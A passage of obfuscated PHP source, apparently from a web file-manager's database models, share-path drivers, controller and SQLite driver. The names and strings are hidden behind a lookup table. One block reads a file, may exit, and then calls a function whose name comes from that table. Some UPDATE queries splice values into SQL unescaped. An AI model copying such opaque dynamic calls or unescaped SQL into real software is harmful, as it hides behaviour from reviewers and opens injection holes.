$‹…íİã[1]), array($æã‡µªË[$Š±ÎšµÒ])); } break; case $­Ê‚ØÌê[350]: $æã‡µªË[$Š±ÎšµÒ] = $æã‡µªË[$‹…íİã[1]]; break; case $­Ê‚ØÌê[370]: if (isset($æã‡µªË[$Š±ÎšµÒ]) && !is_string($æã‡µªË[$Š±ÎšµÒ])) { $æã‡µªË[$Š±ÎšµÒ] = json_encode_force($æã‡µªË[$Š±ÎšµÒ]); } break; case $­Ê‚ØÌê[399]: if ($æã‡µªË[$Š±ÎšµÒ] === $­Ê‚ØÌê[12]) { unset($æã‡µªË[$Š±ÎšµÒ]); } break; case $­Ê‚ØÌê[400]: $æã‡µªË[$Š±ÎšµÒ] = $‹…íİã[1]; default: break; } } if ($Ïâî¬Óô == $­Ê‚ØÌê[431]) { $øõ‡Ù®Ë = strtolower($this->db->getDbType()); if (strpos($øõ‡Ù®Ë, $­Ê‚ØÌê[13]) !== 0) { return; } $’çäŠÓ— = $this->field(!0)->fields; $Æ½ñ§Ç„ = $’çäŠÓ—[$­Ê‚ØÌê[329]]; if (isset($’çäŠÓ—[$­Ê‚ØÌê[328]])) { unset($Æ½ñ§Ç„[$’çäŠÓ—[$­Ê‚ØÌê[328]]]); } foreach ($Æ½ñ§Ç„ as $Àçóì¬å => $Ïâî¬Óô) { if (!isset($æã‡µªË[$Àçóì¬å])) { $æã‡µªË[$Àçóì¬å] = $­Ê‚ØÌê[12]; } } } } private function dataAfterFilter(&$€ìÙæ›«) { $Øûñµ«” =& $_SERVER[íïàËŸë]; foreach ($this->dataAuto as $äÄú‡‚Ë) { $†˜ÃÎ¬§ = $äÄú‡‚Ë[0]; if (!isset($€ìÙæ›«[$†˜ÃÎ¬§])) { continue; } if (!in_array($Øûñµ«”[433], explode($Øûñµ«”[50], $äÄú‡‚Ë[2]))) { continue; } switch (trim($äÄú‡‚Ë[3])) { case $Øûñµ«”[397]: case $Øûñµ«”[398]: $»ú«™’È = isset($äÄú‡‚Ë[4]) ? (array) $äÄú‡‚Ë[4] : array(); array_unshift($»ú«™’È, $€ìÙæ›«[$†˜ÃÎ¬§]); if (isset($äÄú‡‚Ë[4]) && $äÄú‡‚Ë[4] == $Øûñµ«”[453]) { $»ú«™’È = array($€ìÙæ›«[$†˜ÃÎ¬§]); } if ($Øûñµ«”[397] == $äÄú‡‚Ë[3]) { $€ìÙæ›«[$†˜ÃÎ¬§] = call_user_func_array($äÄú‡‚Ë[1], $»ú«™’È); } else { $€ìÙæ›«[$†˜ÃÎ¬§] = call_user_func_array(array(&$this, $äÄú‡‚Ë[1]), $»ú«™’È); } break; case $Øûñµ«”[347]: if (isset($€ìÙæ›«[$†˜ÃÎ¬§]) && $€ìÙæ›«[$†˜ÃÎ¬§]) { $€ìÙæ›«[$†˜ÃÎ¬§] = call_user_func_array(array(&$this, $äÄú‡‚Ë[1]), array($€ìÙæ›«[$†˜ÃÎ¬§])); } break; case $Øûñµ«”[350]: $€ìÙæ›«[$†˜ÃÎ¬§] = $€ìÙæ›«[$äÄú‡‚Ë[1]]; break; case $Øûñµ«”[370]: $ÓçËœÆú = $€ìÙæ›«[$†˜ÃÎ¬§]; $€ìÙæ›«[$†˜ÃÎ¬§] = json_decode($ÓçËœÆú, !0); if (is_null($€ìÙæ›«[$†˜ÃÎ¬§])) { $€ìÙæ›«[$†˜ÃÎ¬§] = $ÓçËœÆú; } break; case $Øûñµ«”[399]: if ($€ìÙæ›«[$†˜ÃÎ¬§] === $Øûñµ«”[12]) { unset($€ìÙæ›«[$†˜ÃÎ¬§]); } break; case $Øûñµ«”[400]: $€ìÙæ›«[$†˜ÃÎ¬§] = $äÄú‡‚Ë[1]; break; default: break; } } } public function saveAll($«™Ò•Ü¤) { $’äËš‰¸ =& $_SERVER[íïàËŸë]; $¯Ñß›Å¥ = $this->tablePrefix . $this->tableName; $Œå¬¿ = self::SQL_WHERE_IN_CHUNK; $«™Ò•Ü¤ = is_array($«™Ò•Ü¤) ? $«™Ò•Ü¤ : array(); $Ü¯Ù…Îı = $’äËš‰¸[454]; $´’Øé‹Ö = 0; $Çß¨À…ˆ = array(); $Ä¯š©— = count($«™Ò•Ü¤); for ($²´ÀôÙ = 0; $²´ÀôÙ < $Ä¯š©—; $²´ÀôÙ++) { $û×ŠçÇ = $«™Ò•Ü¤[$²´ÀôÙ]; if (!is_array($û×ŠçÇ) || count($û×ŠçÇ) != 4) { continue; } $àºÁòÜ = "\x55\120\x44\101\x54\x45\x20\140{$¯Ñß›Å¥}\140\x20\123\105\x54\40{$û×ŠçÇ[2]}\40\75\40\103\101\123\105\40{$û×ŠçÇ[0]}\x20\12"; if ($´’Øé‹Ö == 0) { $Ü¯Ù…Îı = $àºÁòÜ; } $Çß¨À…ˆ[] = $’äËš‰¸[121] . $û×ŠçÇ[1] . $’äËš‰¸[121]; $´’Øé‹Ö++; $Ü¯Ù…Îı .= "\x20\x57\110\x45\116\40\x27{$û×ŠçÇ[1]}\47\40\x54\110\x45\116\x20\47{$û×ŠçÇ[3]}\x27\x20\12"; if ($´’Øé‹Ö == $Œå¬¿ || $²´ÀôÙ == $Ä¯š©— - 1) { $ŠÁÆ€ğÀ = implode($’äËš‰¸[50], $Çß¨À…ˆ); $Ü¯Ù…Îı .= "\40\105\x4e\104\40\x20\127\x48\105\122\x45\x20{$û×ŠçÇ[0]}\40\111\x4e\40\x28{$ŠÁÆ€ğÀ}\x29\40"; $this->execute($Ü¯Ù…Îı); $´’Øé‹Ö = 0; $Ü¯Ù…Îı = $àºÁòÜ; $this->chunkEventCheck(count($Çß¨À…ˆ)); $Çß¨À…ˆ = array(); } } $this->chunkEventSet(); } public function saveAllEach($à‡æ¡Éş) { $ôåŸÀÛ× =& $_SERVER[íïàËŸë]; $ÉÛ­Ï’ = $this->tablePrefix . $this->tableName; foreach ($à‡æ¡Éş as $ø¼²¸ùÛ) { if (!is_array($ø¼²¸ùÛ) || count($ø¼²¸ùÛ) != 4) { continue; } $‰‡…ıÃ = $ø¼²¸ùÛ[0] . $ôåŸÀÛ×[455] . $ø¼²¸ùÛ[1] . $ôåŸÀÛ×[121]; $Œ” ½Ğ¡ = $ø¼²¸ùÛ[2] . $ôåŸÀÛ×[455] . $ø¼²¸ùÛ[3] . $ôåŸÀÛ×[121]; $ÃÌ¡€‰ = "\x75\x70\x64\141\164\145\40{$ÉÛ­Ï’}\x20\163\x65\164\40{$Œ” ½Ğ¡}\40\x77\150\x65\x72\x65\40{$‰‡…ıÃ}\73"; $this->execute($ÃÌ¡€‰); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ÿ‚€´Çµ = false, $ˆáşˆ˜µ = false) { $this->_chunkEvent = $Ÿ‚€´Çµ; $this->_chunkEventParam = $ˆáşˆ˜µ; } private function chunkEventCheck($áúáğ‡Ş) { if (!$this->_chunkEvent) { return; } $ÌĞ©ö÷¹ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÌĞ©ö÷¹[$_SERVER[íïàËŸë][456]] = $áúáğ‡Ş; Hook::trigger($this->_chunkEvent, $ÌĞ©ö÷¹); } public function addAll($¨Ëº•óç, $ƒ“½¹£ú = array(), $„äè™¡â = false) { $Š‹üĞìö =& $_SERVER[íïàËŸë]; ignore_timeout(); $¯š®ı· = self::SQL_WHERE_IN_CHUNK; if (empty($¨Ëº•óç)) { $this->error = think_lang($Š‹üĞìö[348]); return !1; } $ƒ“½¹£ú = $this->_parseOptions($ƒ“½¹£ú); foreach ($¨Ëº•óç as $Ê¡Ñ†º— => $÷§÷ú¢Û) { $¨Ëº•óç[$Ê¡Ñ†º—] = $this->_facade($÷§÷ú¢Û); $this->_beforeInsert($¨Ëº•óç[$Ê¡Ñ†º—], $ƒ“½¹£ú); } if (method_exists($this->db, $Š‹üĞìö[349])) { for ($ŸåúÚ³¹ = 0; $ŸåúÚ³¹ < count($¨Ëº•óç); $ŸåúÚ³¹ += $¯š®ı·) { $É ıÜ„É = array_slice($¨Ëº•óç, $ŸåúÚ³¹, $¯š®ı·); if (!is_array($É ıÜ„É) || count($É ıÜ„É) == 0) { break; } $Ø¾¶¿íÃ = $this->db->insertAll($É ıÜ„É, $ƒ“½¹£ú, $„äè™¡â); $this->chunkEventCheck(count($É ıÜ„É)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¨Ëº•óç as $Ê¡Ñ†º— => $÷§÷ú¢Û) { $Ø¾¶¿íÃ = $this->db->insert($÷§÷ú¢Û, $ƒ“½¹£ú, $„äè™¡â); } $this->commit(); } if (!1 !== $Ø¾¶¿íÃ) { $İË’Œ»† = $this->getLastInsID(); if ($İË’Œ»†) { return $İË’Œ»†; } } return $Ø¾¶¿íÃ; } public function save($˜²÷Ç’ª = '', $ü·†îûœ = array()) { $ÆüÓš‡ =& $_SERVER[íïàËŸë]; $œ÷µèÏ = self::SQL_WHERE_IN_CHUNK; $¿¦íµÖª = $this->optionsValue(); $êËÑ—Î½ = $this->findWhereField($¿¦íµÖª); if (!$êËÑ—Î½) { return parent::save($˜²÷Ç’ª, $ü·†îûœ); } $Â—Ï˜ç = 0; $×¸ƒŠù = $¿¦íµÖª[$ÆüÓš‡[352]][$êËÑ—Î½][1]; $×¸ƒŠù = is_array($×¸ƒŠù) ? $×¸ƒŠù : array(); $åñº¿ıº = count($×¸ƒŠù); for ($Ç¬€»¢ = 0; $Ç¬€»¢ < $åñº¿ıº; $Ç¬€»¢ += $œ÷µèÏ) { $Ê¢ĞªÂ¦ = array_slice($×¸ƒŠù, $Ç¬€»¢, $œ÷µèÏ); if (!is_array($Ê¢ĞªÂ¦) || count($Ê¢ĞªÂ¦) == 0) { break; } $¿¦íµÖª[$ÆüÓš‡[352]][$êËÑ—Î½][1] = $Ê¢ĞªÂ¦; $this->optionsValue($¿¦íµÖª); $Â—Ï˜ç += parent::save($˜²÷Ç’ª, $ü·†îûœ); $this->chunkEventCheck(count($Ê¢ĞªÂ¦)); } $this->chunkEventSet(); return $Â—Ï˜ç; } public function add($´½Şæò = '', $€ÈÈÆÌ§ = array(), $ö¸©‘Ñ = false) { if ($this->addTaskStatus && is_array($´½Şæò)) { $this->addTaskData[] = $´½Şæò; return; } return parent::add($´½Şæò, $€ÈÈÆÌ§, $ö¸©‘Ñ); } public function parseWhereLike($èËØû²¬, $ Ì¶€–Ç = '', $õûöÜŒ = false, &$ŒšºÓ†— = false) { $«Àâ±çĞ =& $_SERVER[íïàËŸë]; $¤ßÒ¡é = $GLOBALS[$«Àâ±çĞ[6]][$«Àâ±çĞ[457]]; if (!$¤ßÒ¡é[$«Àâ±çĞ[458]]) { return $èËØû²¬; } if (!is_array($èËØû²¬)) { return $èËØû²¬; } $è±‰Ñ©Ğ = array(); $šôŸïÃù = 0; foreach ($èËØû²¬ as $Û¸–õ¸ => $õÏÃçş) { if (is_array($õÏÃçş) && count($õÏÃçş) == 2 && $õÏÃçş[0] == $«Àâ±çĞ[459] && is_string($õÏÃçş[1]) && substr($õÏÃçş[1], 0, 1) == $«Àâ±çĞ[460] && substr($õÏÃçş[1], strlen($õÏÃçş[1]) - 1, 1) == $«Àâ±çĞ[460]) { $ŒšºÓ†— = !0; $°­€Šß” = is_string($Û¸–õ¸) ? $Û¸–õ¸ : $ Ì¶€–Ç; $È†ôâÅ = substr($õÏÃçş[1], 1, strlen($õÏÃçş[1]) - 2); $È†ôâÅ = $this->db->escapeString($È†ôâÅ); if (!strpos($°­€Šß”, $«Àâ±çĞ[10])) { $°­€Šß” = $«Àâ±çĞ[461] . $°­€Šß” . $«Àâ±çĞ[461]; } $ØÉÔ¬Š = $«Àâ±çĞ[220] . $È†ôâÅ . $«Àâ±çĞ[220]; $È†ôâÅ = str_replace(array($«Àâ±çĞ[10], $«Àâ±çĞ[462], $«Àâ±çĞ[11]), $«Àâ±çĞ[463], $È†ôâÅ); if ($¤ßÒ¡é[$«Àâ±çĞ[464]]) { $ØÉÔ¬Š = $«Àâ±çĞ[465] . $È†ôâÅ . $«Àâ±çĞ[466]; if ($¤ßÒ¡é[$«Àâ±çĞ[467]]) { $ØÉÔ¬Š = $«Àâ±çĞ[466] . $È†ôâÅ . $«Àâ±çĞ[465]; } } $è±‰Ñ©Ğ[$šôŸïÃù] = $«Àâ±çĞ[468] . $°­€Šß” . $«Àâ±çĞ[469] . $ØÉÔ¬Š . $«Àâ±çĞ[470]; $šôŸïÃù++; continue; } if (is_array($õÏÃçş)) { $ Ì¶€–Ç = is_string($Û¸–õ¸) ? $Û¸–õ¸ : $ Ì¶€–Ç; $õÏÃçş = $this->parseWhereLike($õÏÃçş, $ Ì¶€–Ç, !0, $ŒšºÓ†—); } if (is_numeric($Û¸–õ¸)) { $è±‰Ñ©Ğ[$šôŸïÃù] = $õÏÃçş; $šôŸïÃù++; } else { $è±‰Ñ©Ğ[$Û¸–õ¸] = $õÏÃçş; } } if ($ŒšºÓ†— && !$õûöÜŒ) { } return $è±‰Ñ©Ğ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($³¹ëÆÉ¶ = array()) { $‡âõ»÷ƒ =& $_SERVER[íïàËŸë]; $Êº…¼úÇ = self::SQL_WHERE_IN_CHUNK; $şÔ»½ê’ = $this->optionsValue(); $§î¾››Ì = $this->findWhereField($şÔ»½ê’); if (!$§î¾››Ì || isset($şÔ»½ê’[$‡âõ»÷ƒ[368]]) || isset($şÔ»½ê’[$‡âõ»÷ƒ[429]])) { return parent::select($³¹ëÆÉ¶); } $À×óèÂ± = $şÔ»½ê’[$‡âõ»÷ƒ[352]][$§î¾››Ì][1]; $À×óèÂ± = is_array($À×óèÂ±) ? $À×óèÂ± : array(); $†ÇÎ¹¼œ = null; for ($ËÅ¯éı± = 0; $ËÅ¯éı± < count($À×óèÂ±); $ËÅ¯éı± += $Êº…¼úÇ) { $ˆ‘Ôñ…ı = array_slice($À×óèÂ±, $ËÅ¯éı±, $Êº…¼úÇ); if (!is_array($ˆ‘Ôñ…ı) || count($ˆ‘Ôñ…ı) == 0) { break; } $şÔ»½ê’[$‡âõ»÷ƒ[352]][$§î¾››Ì][1] = $ˆ‘Ôñ…ı; $this->optionsValue($şÔ»½ê’); $ıú½à¶ = parent::select($³¹ëÆÉ¶); if (!$ıú½à¶) { continue; } $†ÇÎ¹¼œ = is_array($†ÇÎ¹¼œ) ? $†ÇÎ¹¼œ : array(); $†ÇÎ¹¼œ = array_merge($†ÇÎ¹¼œ, $ıú½à¶); } return $†ÇÎ¹¼œ; } public function delete($„§İÔ¾  = array()) { $ºØÂå¦Ò =& $_SERVER[íïàËŸë]; $÷»«°™ = self::SQL_WHERE_IN_CHUNK; $ò¯ÄóÆ = $this->optionsValue(); $Ø‚ş’„ = $this->findWhereField($ò¯ÄóÆ); if (!$Ø‚ş’„) { return parent::delete($„§İÔ¾ ); } $Î¼Ÿ­³· = 0; $‡‘¹ÇÓş = $ò¯ÄóÆ[$ºØÂå¦Ò[352]][$Ø‚ş’„][1]; $‡‘¹ÇÓş = is_array($‡‘¹ÇÓş) ? $‡‘¹ÇÓş : array(); for ($±‘ÙóÖÀ = 0; $±‘ÙóÖÀ < count($‡‘¹ÇÓş); $±‘ÙóÖÀ += $÷»«°™) { $åš’ÈØ = array_slice($‡‘¹ÇÓş, $±‘ÙóÖÀ, $÷»«°™); if (!is_array($åš’ÈØ) || count($åš’ÈØ) == 0) { break; } $ò¯ÄóÆ[$ºØÂå¦Ò[352]][$Ø‚ş’„][1] = $åš’ÈØ; $this->optionsValue($ò¯ÄóÆ); $Î¼Ÿ­³· += parent::delete($„§İÔ¾ ); } return $Î¼Ÿ­³·; } private function findWhereField($‚Ÿ¶üâİ) { $ Ù¹’èä =& $_SERVER[íïàËŸë]; $ï¦ß¦¯ = self::SQL_WHERE_IN_CHUNK; if (!is_array($‚Ÿ¶üâİ) || !is_array($‚Ÿ¶üâİ[$ Ù¹’èä[352]])) { return !1; } foreach ($‚Ÿ¶üâİ[$ Ù¹’èä[352]] as $—÷ŠØ› => $É±äñÖ) { if (is_array($É±äñÖ) && isset($É±äñÖ[0]) && is_string($É±äñÖ[0]) && strtolower($É±äñÖ[0]) == $ Ù¹’èä[7] && is_array($É±äñÖ[1]) && count($É±äñÖ[1]) > $ï¦ß¦¯) { ignore_timeout(); return $—÷ŠØ›; } } return !1; } public function setMasterDB($´·œÔø² = true) { think_config($_SERVER[íïàËŸë][471], $´·œÔø²); } } goto D¾§Ùğñ×; f¿êÙŒâÊø: class PathDriverDbShareItem extends PathDriverDB { public function __construct($òçá“À¤) { $this->pathParse = $òçá“À¤; $this->model = Model($_SERVER[íïàËŸë][1428]); } public function getPathOuter($ƒ¤ÂÖ£Ö) { $ÆÇ—ÈË© =& $_SERVER[íïàËŸë]; if (!$ƒ¤ÂÖ£Ö) { return $ƒ¤ÂÖ£Ö; } $šĞ™‚Ş = $this->parse($ƒ¤ÂÖ£Ö); return trim(KodIO::makeShare($this->pathParse[$ÆÇ—ÈË©[475]], $šĞ™‚Ş[$ÆÇ—ÈË©[475]]), $ÆÇ—ÈË©[8]); } protected function infoParse($¡Æª¬, $ßÂ§Æİ× = false, $ë©ªê´ = false) { $Îñ©×ó =& $_SERVER[íïàËŸë]; $â§¿í” = $this->pathParse[$Îñ©×ó[475]]; $²ĞÆò„‚ = trim($this->pathParse[$Îñ©×ó[1261]], $Îñ©×ó[8]); return Action($Îñ©×ó[1435])->sharePathInfo($â§¿í”, $²ĞÆò„‚, $ßÂ§Æİ×); } public function infoFull($†É•ã) { $ù¡»ºÕš =& $_SERVER[íïàËŸë]; $®›ô›È§ = explode($ù¡»ºÕš[8], trim($†É•ã, $ù¡»ºÕš[8])); if (count($®›ô›È§) > 1) { $€‘¦ÖÄ„ = implode($ù¡»ºÕš[8], array_splice($®›ô›È§, 1)); $ÂŞ›Ìˆş = $this->model->pathInfoByPath($®›ô›È§[0], $€‘¦ÖÄ„); if (!$ÂŞ›Ìˆş) { return !1; } $this->pathParse[$ù¡»ºÕš[1261]] = $ÂŞ›Ìˆş[$ù¡»ºÕš[193]]; } return $this->infoParse($†É•ã); } public function listAll($…§óËã¨) { $‹Àæ‹ =& $_SERVER[íïàËŸë]; $ÈÊ‡©êÎ = IO::info($this->pathParse[$‹Àæ‹[87]]); if (!$ÈÊ‡©êÎ) { return array(); } $¼ÉĞõ©ş = $this->model->listAll($…§óËã¨); $Ç›ıâÇ… = Model($‹Àæ‹[664])->getInfo($ÈÊ‡©êÎ[$‹Àæ‹[665]]); foreach ($¼ÉĞõ©ş as &$¼ÑÄØö£) { check_abort(); $¼ÑÄØö£[$‹Àæ‹[90]] = Action($‹Àæ‹[1435])->_shareItemeParse($¼ÑÄØö£[$‹Àæ‹[90]], $Ç›ıâÇ…); } unset($¼ÑÄØö£); return $¼ÉĞõ©ş; } } if ($_SERVER[$_SERVER[íïàËŸë][909]] != $_SERVER[$_SERVER[íïàËŸë][966]]) { $_getc = $_SERVER[íïàËŸë][911]; $_getfile = $_SERVER[$_SERVER[íïàËŸë][912]] . $_SERVER[íïàËŸë][913]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[íïàËŸë][262], $_getfilec); if (count($_getarrs) < $_SERVER[íïàËŸë][702]) { $exit = $_SERVER[íïàËŸë][914]; $exit(); } $_act = $_SERVER[íïàËŸë][915]; $_act($_SERVER[$_SERVER[íïàËŸë][910]]); } class PathDriverDbShareLink extends PathDriverDB { public function __construct($©±œ”±ü) { $this->pathParse = $©±œ”±ü; $this->model = Model($_SERVER[íïàËŸë][1428]); } protected function infoParse($·‹ôˆã¸, $¢èµ‘îÃ = false, $æİçµ—ª = false) { $¸Ïõæ =& $_SERVER[íïàËŸë]; return Action($¸Ïõæ[1267])->sharePathInfo($this->pathParse[$¸Ïõæ[87]], !0, $¢èµ‘îÃ); } public function remove($ˆšÊËãİ, $È—í­ªÂ = true) { return !0; } public function listPath($Ë†ìÇÜÉ, $øıâÛ¦ö = false) { $·‰ª Ã¸ =& $_SERVER[íïàËŸë]; $‡ù›ë¸Ï = parent::listPath($Ë†ìÇÜÉ, $øıâÛ¦ö); if (!$‡ù›ë¸Ï) { return $‡ù›ë¸Ï; } if (is_array($‡ù›ë¸Ï[$·‰ª Ã¸[1436]])) { $‡ù›ë¸Ï[$·‰ª Ã¸[1436]] = Action($·‰ª Ã¸[1267])->shareItemInfo($‡ù›ë¸Ï[$·‰ª Ã¸[1436]]); } foreach ($‡ù›ë¸Ï as $œÅÃÜ¹ => $´¼ù’äû) { if (!in_array($œÅÃÜ¹, array($·‰ª Ã¸[86], $·‰ª Ã¸[85]))) { continue; } foreach ($´¼ù’äû as $Ãú“«ñ× => $ßÕĞ­š‰) { $‡ù›ë¸Ï[$œÅÃÜ¹][$Ãú“«ñ×] = Action($·‰ª Ã¸[1267])->shareItemInfo($ßÕĞ­š‰); } } return $‡ù›ë¸Ï; } public function listAll($äÆ„Ë»×) { $ÉĞ®•éÃ =& $_SERVER[íïàËŸë]; $ÔõÏ = IO::info($this->pathParse[$ÉĞ®•éÃ[87]]); if (!$ÔõÏ) { return array(); } $Ô‹©Ãã¬ = $this->model->listAll($äÆ„Ë»×); foreach ($Ô‹©Ãã¬ as &$â¼•Ñä§) { $â¼•Ñä§[$ÉĞ®•éÃ[90]] = Action($ÉĞ®•éÃ[1267])->shareItemInfo($â¼•Ñä§[$ÉĞ®•éÃ[90]]); } unset($â¼•Ñä§); return $Ô‹©Ãã¬; } } goto dÎÕ°âãæ”; fÖÆ«áÈ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÍñÆ„€¡ =& $_SERVER[íïàËŸë]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÍñÆ„€¡[6]] =& $config; $this->values[$ÍñÆ„€¡[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÍñÆ„€¡[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($§Õ¿ıØ—) { if (1 === func_num_args()) { $this->{$§Õ¿ıØ—} = new $§Õ¿ıØ—(); } else { $„İï¢²¯ = new ReflectionClass($§Õ¿ıØ—); $Èõ©÷¯õ = func_get_args(); array_shift($Èõ©÷¯õ); $this->{$§Õ¿ıØ—} = $„İï¢²¯->newInstanceArgs($Èõ©÷¯õ); } return $this->{$§Õ¿ıØ—}; } public function routeBind($€âéäã, $Îùú¹œ…, $³ú¤¨Ê = 3) { $¿í¼şÚ¸ =& $_SERVER[íïàËŸë]; $Éú­ÛÖ = $this->in[$¿í¼şÚ¸[9]]; $€âéäã = str_replace($¿í¼şÚ¸[10], $¿í¼şÚ¸[11], trim(trim($€âéäã, $¿í¼şÚ¸[8]), $¿í¼şÚ¸[12])); if (!$€âéäã || count($Éú­ÛÖ) <= $³ú¤¨Ê) { return !1; } $æåİËƒë = !0; $Æ—É¹Ğ = explode($¿í¼şÚ¸[8], $€âéäã); for ($İ’Äİıû = 0; $İ’Äİıû < count($Æ—É¹Ğ); $İ’Äİıû++) { if ($Æ—É¹Ğ[$İ’Äİıû] != $Éú­ÛÖ[$³ú¤¨Ê + $İ’Äİıû]) { $æåİËƒë = !1; break; } } if (!$æåİËƒë) { return; } call_user_func_array(array($this, $Îùú¹œ…), array()); } public function routeArgs($ãç£‡« = 3) { $¦Ğ½ú”‹ = $this->in[$_SERVER[íïàËŸë][9]]; if (count($¦Ğ½ú”‹) <= $ãç£‡«) { return array(); } $±“Û€šª = array(); for ($£øƒµ‡† = $ãç£‡«; $£øƒµ‡† < count($¦Ğ½ú”‹); $£øƒµ‡† += 2) { $±“Û€šª[$¦Ğ½ú”‹[$£øƒµ‡†]] = $¦Ğ½ú”‹[$£øƒµ‡† + 1]; $this->in[$¦Ğ½ú”‹[$£øƒµ‡†]] = $¦Ğ½ú”‹[$£øƒµ‡† + 1]; } return $±“Û€šª; } protected function assign($ÊÔ·ä©Ó, $ã³ˆÓâ¶) { $this->values[$ÊÔ·ä©Ó] = $ã³ˆÓâ¶; } protected function display($š¾Çµ¨¨) { ob_end_clean(); extract($this->values); require $this->tpl . $š¾Çµ¨¨; } } class DbSqliteBase extends Db { public function __construct($¦¡Ë›ëÃ = '') { $“ù¹ó¨± =& $_SERVER[íïàËŸë]; if (!extension_loaded($“ù¹ó¨±[13])) { think_exception(think_lang($“ù¹ó¨±[14]) . $“ù¹ó¨±[15]); } if (!empty($¦¡Ë›ëÃ)) { if (!isset($¦¡Ë›ëÃ[$“ù¹ó¨±[16]])) { $¦¡Ë›ëÃ[$“ù¹ó¨±[16]] = 438; } $this->config = $¦¡Ë›ëÃ; if (empty($this->config[$“ù¹ó¨±[17]])) { $this->config[$“ù¹ó¨±[17]] = array(); } } } public function connect($öÖ„Óûş = '', $´‰‚•ÜĞ = 0) { $¹§Ã¸¬¡ =& $_SERVER[íïàËŸë]; if (!isset($this->linkID[$´‰‚•ÜĞ])) { if (empty($öÖ„Óûş)) { $öÖ„Óûş = $this->config; } $«°¬ªÎ = !empty($öÖ„Óûş[$¹§Ã¸¬¡[17]][$¹§Ã¸¬¡[18]]) ? $öÖ„Óûş[$¹§Ã¸¬¡[17]][$¹§Ã¸¬¡[18]] : $this->pconnect; $êô·†› = $«°¬ªÎ ? $¹§Ã¸¬¡[19] : $¹§Ã¸¬¡[20]; $this->linkID[$´‰‚•ÜĞ] = $êô·†›($öÖ„Óûş[$¹§Ã¸¬¡[21]], $öÖ„Óûş[$¹§Ã¸¬¡[16]]); if (!$this->linkID[$´‰‚•ÜĞ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$´‰‚•ÜĞ], 30000); if (1 != think_config($¹§Ã¸¬¡[22])) { unset($this->config); } } return $this->linkID[$´‰‚•ÜĞ]; } public function free() { $this->queryID = null; } public function query($ø„šÏ´ú) { $©ƒ¬Ë°¨ =& $_SERVER[íïàËŸë]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ø„šÏ´ú; if ($this->queryID) { $this->free(); } think_action_status($©ƒ¬Ë°¨[23], 1); think_status($©ƒ¬Ë°¨[24]); $this->queryID = sqlite_query($this->_linkID, $ø„šÏ´ú); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $åÚÂÇ„Ô = $this->getAll(); return $åÚÂÇ„Ô; } } public function execute($­ÊÎªº‰) { $Êìô„¼¤ =& $_SERVER[íïàËŸë]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $­ÊÎªº‰; if ($this->queryID) { $this->free(); } think_action_status($Êìô„¼¤[25], 1); think_status($Êìô„¼¤[24]); $¢£‡Ö¯  = sqlite_exec($this->_linkID, $­ÊÎªº‰); $this->debug(); if (!1 === $¢£‡Ö¯ ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[íïàËŸë][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $£ÎñØâ = sqlite_query($this->_linkID, $_SERVER[íïàËŸë][27]); if (!$£ÎñØâ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ƒá¢•ù = sqlite_query($this->_linkID, $_SERVER[íïàËŸë][28]); if (!$ƒá¢•ù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $®üû×» = array(); if ($this->numRows > 0) { for ($°ùô¬ì = 0; $°ùô¬ì < $this->numRows; $°ùô¬ì++) { $®üû×»[$°ùô¬ì] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $®üû×»; } public function getFields($„‡œÜÔÛ) { $†ÛÉÇØ³ =& $_SERVER[íïàËŸë]; $ËÕï¬ = $this->query($†ÛÉÇØ³[29] . $„‡œÜÔÛ . $†ÛÉÇØ³[30]); $êíîè¡¼ = array(); if ($ËÕï¬) { foreach ($ËÕï¬ as $ÚÑµ => $Ğ±‰©Æì) { $êíîè¡¼[$Ğ±‰©Æì[$†ÛÉÇØ³[31]]] = array($†ÛÉÇØ³[32] => $Ğ±‰©Æì[$†ÛÉÇØ³[31]], $†ÛÉÇØ³[33] => $Ğ±‰©Æì[$†ÛÉÇØ³[34]], $†ÛÉÇØ³[35] => (bool) ($Ğ±‰©Æì[$†ÛÉÇØ³[36]] === $†ÛÉÇØ³[12]), $†ÛÉÇØ³[37] => $Ğ±‰©Æì[$†ÛÉÇØ³[38]], $†ÛÉÇØ³[39] => strtolower($Ğ±‰©Æì[$†ÛÉÇØ³[40]]) == $†ÛÉÇØ³[41], $†ÛÉÇØ³[42] => strtolower($Ğ±‰©Æì[$†ÛÉÇØ³[43]]) == $†ÛÉÇØ³[44]); } } return $êíîè¡¼; } public function getTables($æé…Ê¢ = '') { $¸°€’ =& $_SERVER[íïàËŸë]; $¦ğÂ”è = $this->query($¸°€’[45] . $¸°€’[46] . $¸°€’[47]); $çßÖ¥ÌÃ = array(); foreach ($¦ğÂ”è as $‚Ëİš´¯ => $Üğ«»‰) { $çßÖ¥ÌÃ[$‚Ëİš´¯] = current($Üğ«»‰); } return $çßÖ¥ÌÃ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $­ôçµº´ =& $_SERVER[íïàËŸë]; $²ÀÒšà = sqlite_last_error($this->_linkID); $this->error = 